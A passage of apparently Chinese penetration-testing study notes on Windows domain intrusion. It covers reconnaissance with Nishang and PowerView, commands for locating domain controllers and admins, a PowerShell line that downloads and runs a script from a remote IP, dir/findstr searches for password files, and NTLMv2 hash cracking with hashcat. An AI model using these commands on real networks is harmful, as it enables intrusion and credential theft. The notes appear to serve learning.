是一款针对 PowerShell 的渗透工具。</p>\n<p>nishang 需要将整个 zip 都上传，不能单独上传某个脚本，因此需要上传 zip 后在服务端解压，也是有工具滴</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//方式一</span><br><span class=\"line\">Set‐ExecutionPolicy remotesigned 允许导入</span><br><span class=\"line\">Import‐Module .\\nishang.psm1 导入模块</span><br><span class=\"line\">Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.21 ‐ResolveHost</span><br><span class=\"line\"></span><br><span class=\"line\">//以下命令直接运行，不需要导入别的东西，方式二</span><br><span class=\"line\">Set‐ExecutionPolicy remotesigned 允许导入</span><br><span class=\"line\">powershell ‐command &quot;&amp; &#123; import‐module .\\nishang\\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost &#125;&quot;</span><br><span class=\"line\">powershell ‐command &quot;&amp; &#123; import‐module .\\nishang\\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost -ScanPort -Port 445 &#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">//方式三</span><br><span class=\"line\">将powershell脚本放在cs目录下</span><br><span class=\"line\">powershell‐import nishang\\nishang.psm1    //后面的路径为cs中上传的物理路径</span><br><span class=\"line\">powershell Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.21 ‐ResolveHost </span><br></pre></td></tr></table></figure>\n<p>5.fscan</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<p>6.kscan</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<p>7.london</p>\n<blockquote>\n<p>详见 ip 扫描</p>\n</blockquote>\n<h3 id=\"收集域环境信息\"><a class=\"markdownIt-Anchor\" href=\"#收集域环境信息\">#</a> 收集域环境信息</h3>\n<p>1. 权限查询</p>\n<p>四种用户</p>\n<blockquote>\n<p>本地普通用户 PC2008\\haha</p>\n<p>本地管理员用户 PC-2008\\administrator</p>\n<p>域内用户 hack\\zhangsan</p>\n<p>域管用户  hack\\administrator</p>\n</blockquote>\n<p>如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息.</p>\n<p>而本地管理员用户和域内用户可以查询域内信息.</p>\n<p>本地管理员 Admmistrator 权限可以直接提升为 Ntauthority 或 System 权限，因此，在域中，除普通用户外，所有的机器都有 — 个机器用户（用户名是机器名加上 &quot;$&quot;）。在本质上，<strong> 机器的 system 用户对应的就是域里面的机器用户</strong></p>\n<h4 id=\"判断域方法\"><a class=\"markdownIt-Anchor\" href=\"#判断域方法\">#</a> 判断域方法</h4>\n<p>1.ipconfig /all</p>\n<blockquote>\n<p>主 dns 后缀</p>\n<p>通过 nslookup 查询该后缀，可以得到域控</p>\n</blockquote>\n<p>2.systeminfo</p>\n<blockquote>\n<p>域:hack.com</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMubmV0\">3.net</span> config workstation</p>\n<blockquote>\n<p>工作站域 DNS 名称</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzQubmV0\">4.net</span> time /domain</p>\n<blockquote>\n<p>1,2 都代表存在域</p>\n</blockquote>\n<p>1. 存在域，但当前用户不是域用户</p>\n<p>​\t系统错误 5，本地 administrator 是此效果，但提权后，变为第二种现象</p>\n<p>2. 存在域，并且当前用户是域用户</p>\n<p>​\thack.com 当前时间</p>\n<p>3. 当前网络环境为工作组，不存在域</p>\n<p>​\t找不到域控</p>\n<p>降权 - system 变为 administrator 去执行一些命令，计划任务，net localgroup</p>\n<p>提权 - administrator 变为 system 变为域用户</p>\n<p>添加本地管理员的方法：在本地加，在域里面的 domain admins 组加</p>\n<h4 id=\"查询域\"><a class=\"markdownIt-Anchor\" href=\"#查询域\">#</a> 查询域</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net view /domain:xxx     //域内计算机</span><br><span class=\"line\">net group /domain   //查询用户列表</span><br><span class=\"line\">net group &quot;domain admins&quot;/domain   //查询用户列表</span><br><span class=\"line\">nltest /domain_trusts  //获取域信任信息，为后续跨域 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"找域控\"><a class=\"markdownIt-Anchor\" href=\"#找域控\">#</a> 找域控</h3>\n<p>1.nltest /DCLIST:hack</p>\n<blockquote>\n<p>在使用 ping 或者 nslookup 解析域控的 IP</p>\n</blockquote>\n<p>2. 查看域控主域名</p>\n<blockquote>\n<p><code>nslookup ‐type=SRV _ldap._tcp</code></p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMubmV0\">3.net</span> time /domain</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzQubmV0\">4.net</span> group “Domain Controllers” /domain</p>\n<h3 id=\"获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#获取用户信息\">#</a> 获取用户信息</h3>\n<p>1. 查询域内用户</p>\n<p>net user /domain</p>\n<p>2. 获取域内用户详细信息</p>\n<p><code>wmic</code></p>\n<blockquote>\n<p>wmic /?</p>\n<p>wmic user account get all</p>\n<p>wmic useraccount get name</p>\n<blockquote>\n<p>C:\\Users\\18310&gt;wmic useraccount get name<br>\nName<br>\n18310<br>\nAdministrator<br>\nDefaultAccount<br>\nGuest<br>\nhahaha<br>\nmysql<br>\nVUSR_LAPTOP-8A2UNITB<br>\nWDAGUtilityAccount<br>\nwww</p>\n</blockquote>\n<p>wmic useraccount get domain,name</p>\n</blockquote>\n<p>2. 查看存在用户</p>\n<blockquote>\n<p>dsquery</p>\n<p>dsquery user</p>\n<p>dsquery computer</p>\n</blockquote>\n<p>3. 查域管</p>\n<blockquote>\n<p>net group “domain admins” /domain</p>\n<p>net group “Enterprise Admins” /domain</p>\n</blockquote>\n<h3 id=\"定位域管\"><a class=\"markdownIt-Anchor\" href=\"#定位域管\">#</a> 定位域管</h3>\n<p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限，也就是说，当目机被添加到城中。成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中，因此域管理员组的成员都可以访问本地计算机，且具备安全控制权限判断域内机器有谁登陆过，或者谁正在登陆，为后续获取 hash 或明文密码，横向传递做铺垫</p>\n<p>1. 通过 psloggedon.exe</p>\n<blockquote>\n<p>PsLoggedon.exe ahzngsan   // 用户登录过那些机器</p>\n<p>PsLoggedon.exe \\\\PC-2003   // 机器被哪些用户登陆过</p>\n</blockquote>\n<p>2.PVEDFindADUser.exe 工具</p>\n<p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账 户。运行该工具的计算机需要具有.NETFramework 2.0，并且需要具有管理员权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‐h：显示帮助信息</span><br><span class=\"line\">‐current[&quot;username&quot;]：如果仅指定‐current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名</span><br><span class=\"line\">（Domain\\Username），则显示该用户登录的计算机</span><br><span class=\"line\">‐last[&quot;username&quot;]：如果仅指定‐last参数，将获取目标计算机上最后一个登录用户。如果指定了用户名</span><br><span class=\"line\">（Domain\\Username），则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户</span><br><span class=\"line\">名，此时使用该工具可能无法得到用户名</span><br><span class=\"line\">‐noping：阻止该工具在获取用户登陆信息之前对目标执行ping命令</span><br><span class=\"line\">‐target：可选参数，用于指定要查询的主机。如果未指定该参数，将查询域中的所有主机。如果指定了此参数，主机名</span><br><span class=\"line\">列表由逗号分隔</span><br><span class=\"line\">直接运行&quot;pvefindaduser.exe ‐current&quot;，即可显示域中所有计算机上当前登录的用户</span><br></pre></td></tr></table></figure>\n<p>3.netview.exe</p>\n<p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登陆会话，利 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe 的绝大部分功能不需要管理员权限就可以使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用语法：</span><br><span class=\"line\">netview.exe &lt;参数&gt;</span><br><span class=\"line\">‐h：显示帮助菜单。</span><br><span class=\"line\">‐f filename.txt：指定从中提取主机列表的文件。</span><br><span class=\"line\">‐e filename.txt：指定要排除的主机名文件。</span><br><span class=\"line\">‐o filename.txt：将所有输出重定向到文件。</span><br><span class=\"line\">‐d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。</span><br><span class=\"line\">‐g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</span><br><span class=\"line\">‐c：检查对已找到共享的访问权限。</span><br></pre></td></tr></table></figure>\n<p>4.NSE</p>\n<p>如果存在域账户或者本地账户就可以使用 Nmap 的 smb-enum-sessions.nes 引擎获取远程机器的登录会话（不需要管理员权限）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smb‐enum‐domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等</span><br><span class=\"line\">smb‐enum‐users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这</span><br><span class=\"line\">个脚本对域控制器进行扫描</span><br><span class=\"line\">smb‐enum‐shares：遍历远程主机的共享目录</span><br><span class=\"line\">smb‐enum‐processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</span><br><span class=\"line\">smb‐enum‐sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class=\"line\">smb‐os‐discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、</span><br></pre></td></tr></table></figure>\n<p>5.powerview</p>\n<p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">powershell.exe ‐exec bypass ‐command &quot;&amp; &#123; import‐module .\\PowerView.ps1;Invoke‐UserHunter&#125;“</span><br></pre></td></tr></table></figure>\n<h3 id=\"powershell\"><a class=\"markdownIt-Anchor\" href=\"#powershell\">#</a> powershell</h3>\n<p>Powershell 一般初始化情况下都会禁止脚本执行。脚本能否执行取决于 Powershell 的执行策略</p>\n<p>Get-ExecutionPolicy 查看权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy </span><br><span class=\"line\">Unrestricted:权限最高，可以不受限制执行任何脚本。</span><br><span class=\"line\">Default:为Powershell默认的策略：Restricted，不允许任何脚本执行。</span><br><span class=\"line\">AllSigned：所有脚本都必须经过签名才能在运行。</span><br><span class=\"line\">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br></pre></td></tr></table></figure>\n<p><strong>PowerSploit</strong></p>\n<p>PowerSploit 是 GitHub 上面的一个安全项目，上面有很多 powershell 攻击脚本，它们主要被用来渗</p>\n<p>透中的信息侦察、权限提升、权限维持。</p>\n<p>Powershell 的优点:</p>\n<p>1. 代码运行在内存中可以不去接触磁盘</p>\n<p>2. 从另一个系统中下载代码并执行</p>\n<p>3. 很多安全产品并不能监测到 powershell 的活动</p>\n<p>4.cmd.exe 通常被阻止运行，但是 powershell 不会</p>\n<p>执行方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell.exe -exec bypass -command &quot;&amp; &#123; import-module C:\\Users\\Administrator\\Desktop\\PowerView.ps1;Get-NetUser&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">python -m http.server 8080</span><br><span class=\"line\">shell powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:8080/PowerView.ps1&#x27;);import-module .\\PowerView.ps1;Get-NetShare</span><br><span class=\"line\"></span><br><span class=\"line\">beacon&gt; powershell-import //导入各种powershell脚本</span><br><span class=\"line\">beacon&gt;powershell posershell脚本名 //执行脚本</span><br><span class=\"line\">beacon&gt; powershell Check-VM //执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>Nishang</strong></p>\n<p>Nishang 是一款针对 PowerShell 的渗透工具。</p>\n<p>查看模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell Import-Module .\\nishang\\nishang.psm1;Get-Command -Module nishang</span><br></pre></td></tr></table></figure>\n<p>远程执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell-import nishang\\nishang.psm1</span><br><span class=\"line\">powershell 命令</span><br></pre></td></tr></table></figure>\n<h3 id=\"定位敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#定位敏感信息\">#</a> 定位敏感信息</h3>\n<p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。</p>\n<p>资料、数据、文件的定位流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">定位内部人事组织结构</span><br><span class=\"line\"></span><br><span class=\"line\">在内部人事组织结构中寻找需要监视的人员</span><br><span class=\"line\"></span><br><span class=\"line\">定位相关人员的机器</span><br><span class=\"line\"></span><br><span class=\"line\">视相关人员存放文档的位置</span><br><span class=\"line\"></span><br><span class=\"line\">列出存放文档的服务器的目录</span><br></pre></td></tr></table></figure>\n<p>重点核心业务机器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">高级管理人员 系统管理人员 财务/人事/业务人员的个人计算机</span><br><span class=\"line\">产品管理系统服务器</span><br><span class=\"line\">办公系统服务器</span><br><span class=\"line\">财务应用系统服务器</span><br><span class=\"line\">核心产品源码服务器（SVN/GIT服务器）</span><br><span class=\"line\">数据库服务器</span><br><span class=\"line\">文件服务器，</span><br><span class=\"line\">共享服务器</span><br><span class=\"line\">电子邮件服务器</span><br><span class=\"line\">网站监控系统服务器</span><br><span class=\"line\">信息安全监控服务器</span><br><span class=\"line\">生产工厂服务器</span><br></pre></td></tr></table></figure>\n<p>敏感信息和敏感文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">站点源码备份文件，</span><br><span class=\"line\">数据库备份文件等等</span><br><span class=\"line\">游览器保存的密码和游览器的cookie</span><br><span class=\"line\">其他用户会话，</span><br><span class=\"line\">3389和ipc$连接记录，</span><br><span class=\"line\">回收站中的信息等等</span><br><span class=\"line\">Windows的无线密码</span><br><span class=\"line\">网络内部的各种账号密码，</span><br><span class=\"line\">包含电子邮箱，V**，FTP等等</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.指定目录下搜集各类敏感文件</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.txt&quot;</span><br><span class=\"line\">dir /a /s /b C:\\&quot;*.xlsx&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.md&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.sql&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.pdf&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.docx&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.doc&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*conf*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*bak*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*pwd*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*pass*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*login*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*user*&quot;</span><br><span class=\"line\">2.指定目录下的文件中搜集各种账号密码</span><br><span class=\"line\">findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure>\n<h2 id=\"windows-认证密码抓取\"><a class=\"markdownIt-Anchor\" href=\"#windows-认证密码抓取\">#</a> windows 认证密码抓取</h2>\n<p>windows 认证</p>\n<p>本地</p>\n<p>网络</p>\n<p>kerberos</p>\n<h3 id=\"本地认证-ntlm和lm\"><a class=\"markdownIt-Anchor\" href=\"#本地认证-ntlm和lm\">#</a> 本地认证 - NTLM 和 LM</h3>\n<p>Windows 的登陆密码是储存在系统本地的 SAM 文件中的，在登陆 Windows 的时候，系统会将用户输入的密码与 SAM 文件中的密码进行对比，如果相同，则认证成功</p>\n<p>SAM 文件是位于 % SystemRoot%\\system32\\config\\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203160013739.png\" alt=\"image-20221203160013739\"></p>\n<p>Windows 本地认证流程如下：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203160134713.png\" alt=\"image-20221203160134713\"></p>\n<p>首先，用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登陆界面，也就是输入框界面，接收用户的输入信息后，将密码交给 lsass 进程，这个过程中会存一份明文密码，将明文密码加密成 NTLM Hash，对 SAM 数据库进行比较认证</p>\n<p>Windows Logon Process（即 winlogon.exe）：是 Windows NT 用户登陆程序，用于管理用户登陆和退出</p>\n<p>LSASS：用于微软 Windows 系统的安全机制，它用于本地安全和登陆策略</p>\n<p>本地认证中用来处理用户输入密码的进程即 lsass.exe, 密码会在这个进程中明文保存，供该进程将密码计算成 NTLMHash 与 sam 进行比对，我们使用 mimikatz 来获取的明文密码，便是在这个进程中读取到的</p>\n<p>Windows 操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在 ntds.dit 中，加密后为散列值。 Windows 操作系统中的密码一般由两部分组成，一部分为 LM Hash, 另一部分为 NTLMHash。在 Windows 操作系统中，Hash 的结构通常如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username:RID:LM‐HASH:NT‐HASH</span><br></pre></td></tr></table></figure>\n<p>LM Hash 的全名为 &quot;LAN Manager Hash&quot;, 是微软为了提高 Windows 操作系统的安全性而采 用的散列加密算法，其本质是 DES 加密。尽管 LM Hash 较容易被破解，但为了保证系统的兼容性，Windows 只是将 LM Hash 禁用了 (从 Windows vista 和 Windows Server2008 版本开始，Windows 操作系统默认禁用 LM Hash)。</p>\n<p>LM Hash 明文密码被限定在 14 位以内，也就是说，如果要停止使用 LM Hash, 将用 户的密码设置为 14 位以上即可。如果 LM Hash 被禁用了，攻击者通过工具抓取的 LM Hash 通常 为 “ad3b435b51404eead3b435b51404ee”(表示 LM Hash 为空值或被禁用) NTLM Hash 是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于 MD4 加密算法进行加密的。个人版从 Windows vista 以后，服务器版从 Windows Server 2003 以后，Windows 操作系统的认证方式均为 NTLM Hash 为了解决 LM 加密和身份验证方案中固有的安全弱点，Microsoft 于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。</p>\n<h3 id=\"windows网络认证\"><a class=\"markdownIt-Anchor\" href=\"#windows网络认证\">#</a> Windows 网络认证</h3>\n<p>在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的，只能是点对点进行信息的传输。举个例子就是，主机 A 想要访问主机 B 上的资源，就要向主机 B 发送一个存在于主机 B 上的一个账户，主机 B 接收以后会在本地进行验证，如果验证成功，才会允许主机 A 进行相应的访问</p>\n<p>NTLM 协议是一种基于 挑战（Chalenge）/ 响应（Response） 认证机制，仅支持 Windows 的网络认证协议。</p>\n<p>它主要分为协商、质询和验证三个步骤：</p>\n<blockquote>\n<p>协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。</p>\n<p>质询，这一步便是 Chalenge/Response 认证机制的关键之处，下面会介绍这里的步骤。</p>\n<p>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源</p>\n</blockquote>\n<p>认证流程<br>\n 1、首先，client 会向 server 发送一个 username，这个 username 是存在于 server 上的一个用户</p>\n<p>2、首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个 16 位的随机字符，即 Chalenge，然后用查询到的这个 user 的 NTLM hash 对 Chalenge 进行加密，生成 Chalenge1，将 Chalenge1 存储在本地，并将 Chalenge 传给 client。</p>\n<p>认证失败</p>\n<p>1、首先，client 会向 server 发送一个 username，这个 username 是存在于 server 上的一个用户</p>\n<p>2、当 server 接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败</p>\n<p>3、当 client 接收到 Chalenge 时，将发送的 username 所对应的 NTLM hash 对 Chalenge 进行加密即 Response，并 Response 发送给 server。</p>\n<p>4、server 在收到 Response 后，将其与 Chalenge1 进行比较，如果相同，则验证成功</p>\n<p>NTLM v1 的 Challenge 有 8 位，NTLM v1 的主要加密算法是 DES</p>\n<p>NTLM v2 的 Challenge 为 16 位；NTLM v2 的主要加密算法是 HMAC‐MD5。</p>\n<p><code>net use \\\\192.168.41.130 /u:kkk Admin@123</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205140859339.png\" alt=\"image-20221205140859339\"></p>\n<p>NTLMv2 格式如下：</p>\n<p>username::domain:challenge:HMAC‐MD5:blob</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username：对应数据包中 user name</span><br><span class=\"line\">domain:对应数据包中的 Domain name</span><br><span class=\"line\">HMAC‐MD5：对应数据包中的NTProofStr</span><br><span class=\"line\">blob：数据库包中rsponse去掉HMAC‐MD5的值</span><br></pre></td></tr></table></figure>\n<p>使用 hashcat 破解密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat ‐m 5600kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000 1.txt ‐‐force</span><br></pre></td></tr></table></figure>\n<p>抓取 NTLMV2：Inveigh-master</p>\n<h3 id=\"kerberos认证\"><a class=\"markdownIt-Anchor\" href=\"#kerberos认证\">#</a> Kerberos 认证</h3>\n<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的</p>\n<p>kerberos 协议中也存在三个角色，分别是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端（client）：发送请求的一方</span><br><span class=\"line\">服务端（Server）：接收请求的一方</span><br><span class=\"line\">密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：</span><br><span class=\"line\">AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</span><br><span class=\"line\">TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</span><br></pre></td></tr></table></figure>\n<p>所以整个 kerberos 认证流程可以简化描述如下： 客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；</span><br><span class=\"line\">2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205143756973.png\" alt=\"image-20221205143756973\"></p>\n<p>所以 kerberos 通信可以分为 3 步，我们逐步详解</p>\n<p><strong>通信第一步客户端和 AS 进行通信</strong></p>\n<p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到 KDC 